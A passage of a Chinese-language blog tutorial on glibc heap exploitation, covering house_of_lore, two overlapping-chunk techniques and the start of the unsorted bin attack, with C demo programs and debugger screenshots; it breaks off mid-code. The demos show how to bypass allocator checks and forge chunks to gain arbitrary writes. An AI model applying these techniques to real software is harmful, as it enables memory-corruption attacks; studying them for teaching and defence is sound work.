stack_buffer_2[<span class="hljs-number">2</span>] = (<span class="hljs-keyword">intptr_t</span>*)stack_buffer_1;<br><br>  <span class="hljs-keyword">void</span> *p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;另外再分配一块，避免与 top chunk 合并 %p\n&quot;</span>, p5);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Free victim chunk %p, 他会被插入到 fastbin 中\n&quot;</span>, victim);<br>  <span class="hljs-built_in">free</span>((<span class="hljs-keyword">void</span>*)victim);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n此时 victim chunk 的 fd、bk 为零\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;victim-&gt;fd: %p\n&quot;</span>, (<span class="hljs-keyword">void</span> *)victim[<span class="hljs-number">0</span>]);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="hljs-keyword">void</span> *)victim[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这时候去申请一个 chunk，触发 fastbin 的合并使得 victim 进去 unsortedbin 中处理，最终被整理到 small bin 中 %p\n&quot;</span>, victim);<br>  <span class="hljs-keyword">void</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1200</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在 victim chunk 的 fd 和 bk 更新为 unsorted bin 的地址\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;victim-&gt;fd: %p\n&quot;</span>, (<span class="hljs-keyword">void</span> *)victim[<span class="hljs-number">0</span>]);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="hljs-keyword">void</span> *)victim[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在模拟一个可以覆盖 victim 的 bk 指针的漏洞，让他的 bk 指针指向栈上\n&quot;</span>);<br>  victim[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">intptr_t</span>)stack_buffer_1;<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;然后申请跟第一个 chunk 大小一样的 chunk\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;他应该会返回 victim chunk 并且它的 bk 为修改掉的 victim 的 bk\n&quot;</span>);<br>  <span class="hljs-keyword">void</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;最后 malloc 一次会返回 victim-&gt;bk 指向的那里\n&quot;</span>);<br>  <span class="hljs-keyword">char</span> *p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 = malloc(100)\n&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n在最后一个 malloc 之后，stack_buffer_2 的 fd 指针已更改 %p\n&quot;</span>,stack_buffer_2[<span class="hljs-number">2</span>]);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\np4 在栈上 %p\n&quot;</span>, p4);<br>  <span class="hljs-keyword">intptr_t</span> sc = (<span class="hljs-keyword">intptr_t</span>)jackpot;<br>  <span class="hljs-built_in">memcpy</span>((p4+<span class="hljs-number">40</span>), &amp;sc, <span class="hljs-number">8</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>​    运行结果。</p>
<p> <img src="https://s2.loli.net/2021/12/26/5OyWv8dVYRTa4wj.png" srcset="/img/loading.gif" lazyload></p>
<p>​    在前面的技术中，我们已经知道怎样去伪造一个fake chunk，接下来，我们要尝试伪造一条small bins链。</p>
<p>​    首先创建两个chunk，第一个是我们的victim chunk，请确保它是一个small chunk，第二个随意，只是为了确保在free时victim chunk不会被合并进top chunk 里。然后，在栈上伪造两个fake chunk，让fake chunk 1的fd指向victim chunk，bk指向fake chunk 2，fake chunk 2的fd指向fake chunk 1，这样一个small bin链就差不多了。</p>
<p>​    如下图所示。</p>
<p> <img src="https://s2.loli.net/2021/12/26/RGWzOsBaIo3iklQ.png" srcset="/img/loading.gif" lazyload></p>
<p> <img src="https://s2.loli.net/2021/12/26/JWZ3aK6tqDVk8oX.png" srcset="/img/loading.gif" lazyload></p>
<p>​    Glibc在malloc的时候会检查small bin链表中第二块chunk的bk指针是否指向第一块，来发现对small bins的破坏。为了绕过这个检查，所以才需要同时伪造bin中的前两个chunk。</p>
<p>​    接下来释放掉victim chunk，它首先会被放到fast bin中，这时候我们再去malloc一个large chunk，那么就会触发fast bin的合并，然后victim chunk就放到了unsorted bin中，最终被整理到small bin中。</p>
<p>​    接下来的第一个相应大小的malloc，会返回victim chunk的地址，再一次malloc将返回fake chunk 1的地址，地址在栈上且我们能够控制。</p>
<p> <img src="https://s2.loli.net/2021/12/26/y5V1W26vkqjYgpE.png" srcset="/img/loading.gif" lazyload></p>
<p>​    于是我们就成功地骗过了malloc在栈上分配了一个chunk。最后再想一下，其实最初的victim chunk使用fast chunk也是可以的，其释放后虽然是被加入到 fast bins中，而不是unsorted bin，但malloc之后，也会被整理到small bins里。自行尝试吧。</p>
<h2 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping_chunks"></a>overlapping_chunks</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc , <span class="hljs-keyword">char</span>* argv[])</span></span>&#123;<br><br>    <span class="hljs-keyword">intptr_t</span> *p1,*p2,*p3,*p4;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这是一个简单的堆块重叠问题，首先申请 3 个 chunk\n&quot;</span>);<br><br>    p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>    p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>    p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span> - <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这三个 chunk 分别申请到了:\np1：%p\np2：%p\np3：%p\n给他们分别填充\&quot;1\&quot;\&quot;2\&quot;\&quot;3\&quot;\n\n&quot;</span>, p1, p2, p3);<br><br>    <span class="hljs-built_in">memset</span>(p1, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">memset</span>(p2, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">0x80</span> - <span class="hljs-number">8</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;free 掉 p2\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(p2);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p2 被放到 unsorted bin 中\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在假设有一个堆溢出漏洞，可以覆盖 p2\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;为了保证堆块稳定性，我们至少需要让 prev_inuse 为 1，确保 p1 不会被认为是空闲的堆块\n&quot;</span>);<br><br>    <span class="hljs-keyword">int</span> evil_chunk_size = <span class="hljs-number">0x181</span>;<br>    <span class="hljs-keyword">int</span> evil_region_size = <span class="hljs-number">0x180</span> - <span class="hljs-number">8</span>;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们将 p2 的大小设置为 %d, 这样的话我们就能用 %d 大小的空间\n&quot;</span>,evil_chunk_size, evil_region_size);<br><br>    *(p2<span class="hljs-number">-1</span>) = evil_chunk_size; <span class="hljs-comment">// 覆盖 p2 的 size</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n现在让我们分配另一个块，其大小等于块p2注入大小的数据大小\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;malloc 将会把前面 free 的 p2 分配给我们（p2 的 size 已经被改掉了）\n&quot;</span>);<br>    p4 = <span class="hljs-built_in">malloc</span>(evil_region_size);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\np4 分配在 %p 到 %p 这一区域\n&quot;</span>, (<span class="hljs-keyword">char</span> *)p4, (<span class="hljs-keyword">char</span> *)p4+evil_region_size);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p3 从 %p 到 %p\n&quot;</span>, (<span class="hljs-keyword">char</span> *)p3, (<span class="hljs-keyword">char</span> *)p3+<span class="hljs-number">0x80</span><span class="hljs-number">-8</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 应该与 p3 重叠，在这种情况下 p4 包括所有 p3\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这时候通过编辑 p4 就可以修改 p3 的内容，修改 p3 也可以修改 p4 的内容\n\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;接下来验证一下，现在 p3 与 p4:\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 = %s\n&quot;</span>, (<span class="hljs-keyword">char</span> *)p4+<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p3 = %s\n&quot;</span>, (<span class="hljs-keyword">char</span> *)p3+<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n如果我们使用 memset(p4, &#x27;4&#x27;, %d), 将会:\n&quot;</span>, evil_region_size);<br>    <span class="hljs-built_in">memset</span>(p4, <span class="hljs-string">&#x27;4&#x27;</span>, evil_region_size);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 = %s\n&quot;</span>, (<span class="hljs-keyword">char</span> *)p4+<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p3 = %s\n&quot;</span>, (<span class="hljs-keyword">char</span> *)p3+<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n那么之后再 memset(p3, &#x27;3&#x27;, 80), 将会:\n&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">80</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 = %s\n&quot;</span>, (<span class="hljs-keyword">char</span> *)p4+<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p3 = %s\n&quot;</span>, (<span class="hljs-keyword">char</span> *)p3+<span class="hljs-number">0x10</span>);<br>&#125;     <br></code></pre></td></tr></table></figure>

<p>   这个比较简单，就是堆块重叠的问题。通过一个溢出漏洞，改写unsorted bin 中空闲堆块的size，改变下一次malloc可以返回的堆块大小。</p>
<p>​    直接动手调试，首先申请三个堆块。</p>
<p> <img src="https://s2.loli.net/2021/12/26/TvWyefJ19bFz7La.png" srcset="/img/loading.gif" lazyload></p>
<p>​    接着free掉p2，这时候p2被放到unsorted bin中。 </p>
<p> <img src="https://s2.loli.net/2021/12/26/cOJpNVPItwQTREK.png" srcset="/img/loading.gif" lazyload></p>
<p>​    然后把p2的size改成0x180，这时候就把p3给包含进去了。</p>
<p> <img src="https://s2.loli.net/2021/12/26/eTDvralqCkFRJ5V.png" srcset="/img/loading.gif" lazyload></p>
<p>​    然后再去申请一块大小为0x180的堆块p4，就能够编辑p4，就可以修改p3的内容，编辑p3也可以修改p4的内容。</p>
<p> <img src="https://s2.loli.net/2021/12/26/PbgcKN1Rm2wMW7n.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="overlapping-chunks-2"><a href="#overlapping-chunks-2" class="headerlink" title="overlapping_chunks_2"></a>overlapping_chunks_2</h2><p>   同样是堆块重叠的问题，前面那个是在chunk已经被free，加入到了unsorted bin之后，再修改其size值，然后malloc一个不一样的chunk出来，而这里是在 free之前修改size值，使free错误地修改了下一个chunk的prev_size值，导致中间的chunk强行合并。另外前面那个重叠是相邻堆块之间的，而这里是不相邻堆块之间的。</p>
<p>   源码如下。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>  <br>  <span class="hljs-keyword">intptr_t</span> *p1,*p2,*p3,*p4,*p5,*p6;<br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;<br>  <span class="hljs-keyword">int</span> prev_in_use = <span class="hljs-number">0x1</span>;<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n一开始分配 5 个 chunk&quot;</span>);<br>  p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br><br>  real_size_p1 = malloc_usable_size(p1);<br>  real_size_p2 = malloc_usable_size(p2);<br>  real_size_p3 = malloc_usable_size(p3);<br>  real_size_p4 = malloc_usable_size(p4);<br>  real_size_p5 = malloc_usable_size(p5);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p1 从 %p 到 %p&quot;</span>, p1, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *)p1+malloc_usable_size(p1));<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p2 从 %p 到 %p&quot;</span>, p2,  (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *)p2+malloc_usable_size(p2));<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p3 从 %p 到 %p&quot;</span>, p3,  (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *)p3+malloc_usable_size(p3));<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p4 从 %p 到 %p&quot;</span>, p4, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *)p4+malloc_usable_size(p4));<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p5 从 %p 到 %p\n&quot;</span>, p5,  (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *)p5+malloc_usable_size(p5));<br><br>  <span class="hljs-built_in">memset</span>(p1,<span class="hljs-string">&#x27;A&#x27;</span>,real_size_p1);<br>  <span class="hljs-built_in">memset</span>(p2,<span class="hljs-string">&#x27;B&#x27;</span>,real_size_p2);<br>  <span class="hljs-built_in">memset</span>(p3,<span class="hljs-string">&#x27;C&#x27;</span>,real_size_p3);<br>  <span class="hljs-built_in">memset</span>(p4,<span class="hljs-string">&#x27;D&#x27;</span>,real_size_p4);<br>  <span class="hljs-built_in">memset</span>(p5,<span class="hljs-string">&#x27;E&#x27;</span>,real_size_p5);<br>  <br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n释放掉堆块 p4，在这种情况下不会用 top chunk 合并\n&quot;</span>);<br>  <span class="hljs-built_in">free</span>(p4);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n假设 p1 上的漏洞，该漏洞会把 p2 的 size 改成 p2+p3 的 size\n&quot;</span>);<br>  *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">size_t</span>) * <span class="hljs-number">2</span>;<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nfree p2 的时候分配器会因为 p2+p2.size 的结果指向 p4，而误以为下一个 chunk 是 p4\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n这样的话将会 free 掉的 p2 将会包含 p3\n&quot;</span>);<br>  <span class="hljs-built_in">free</span>(p2);<br>  <br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n现在去申请 2000 大小的 chunk p6 的时候，会把之前释放掉的 p2 与 p3 一块申请回来\n&quot;</span>);<br>  p6 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">2000</span>);<br>  real_size_p6 = malloc_usable_size(p6);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p6 从 %p 到 %p&quot;</span>, p6,  (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *)p6+real_size_p6);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p3 从 %p 到 %p\n&quot;</span>, p3, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *) p3+real_size_p3);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\np3 中的内容: \n\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s\n&quot;</span>,(<span class="hljs-keyword">char</span> *)p3);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n往 p6 中写入\&quot;F\&quot;\n&quot;</span>);<br>  <span class="hljs-built_in">memset</span>(p6,<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-number">1500</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\np3 中的内容: \n\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s\n&quot;</span>,(<span class="hljs-keyword">char</span> *)p3);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>​    我们需要五个堆块，假设第chunk 1存在溢出，可以改写第二个chunk 2的数据，chunk 5的作用是防止释放chunk 4后,被合并进top chunk。所以我们要重叠的区域是chunk 2到chunk 4。</p>
<p>   首先申请5个chunk，分别是p1，p2，p3，p4，p5。</p>
<p> <img src="https://s2.loli.net/2021/12/26/QKSJm9X8iYlOyfZ.png" srcset="/img/loading.gif" lazyload></p>
<p>   然后free掉p4，p4被放入unsorted bin。</p>
<p> <img src="https://s2.loli.net/2021/12/26/x6e9ujCEaIkrSJR.png" srcset="/img/loading.gif" lazyload></p>
<p>接下来是最关键的一步，利用chunk 1的溢出漏洞，将chunk 2的size值修改为chunk 2和chunk 3的大小之和，即0x3f0+0x3f0+0x1=0x7e1，最后的1是标志位。</p>
<p> <img src="https://s2.loli.net/2021/12/26/amQFXLNWRftEqbp.png" srcset="/img/loading.gif" lazyload></p>
<p>这样当我们释放chunk 2的时候，malloc根据这个被修改的size值，会以为chunk 2加上 chunk 3的区域都是要释放的，然后就错误地修改了chunk 5的 prev_size。接着，它发现紧邻的一块chunk 4也是 free 状态，就把它俩合并在了一起，组成一个大free chunk，放进unsorted bin中。</p>
<p> <img src="https://s2.loli.net/2021/12/26/AY5ETmLWcVjosv9.png" srcset="/img/loading.gif" lazyload></p>
<p>   再次去malloc 0x7e0大小的chunk p6会把包含p3的p2给申请到，这样再去编辑p6的时候也可以编辑到p3。</p>
<p> <img src="https://s2.loli.net/2021/12/26/mTQBqEvzVJIyWo7.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h2><p>​    unsorted bin攻击通常是为更进一步的攻击做准备的，我们知道unsorted bin是一个双向链表，在分配时会通过unlink操作将chunk从链表中移除，所以如果能够控制unsorted bin chunk的bk指针，就可以向任意位置写入一个指针。</p>
<p>  源码如下。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备\n\n&quot;</span>);<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> stack_var=<span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们准备把这个地方 %p 的值 %ld 更改为一个很大的数\n\n&quot;</span>, &amp;stack_var, stack_var);<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;一开始先申请一个比较正常的 chunk: %p\n&quot;</span>,p);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;再分配一个避免与 top chunk 合并\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br><br>    <span class="hljs-built_in">free</span>(p);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;当我们释放掉第一个 chunk 之后他会被放到 unsorted bin 中，同时它的 bk 指针为 %p\n&quot;</span>,(<span class="hljs-keyword">void</span>*)p[<span class="hljs-number">1</span>]);<br><br>    p[<span class="hljs-number">1</span>]=(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(&amp;stack_var<span class="hljs-number">-2</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span 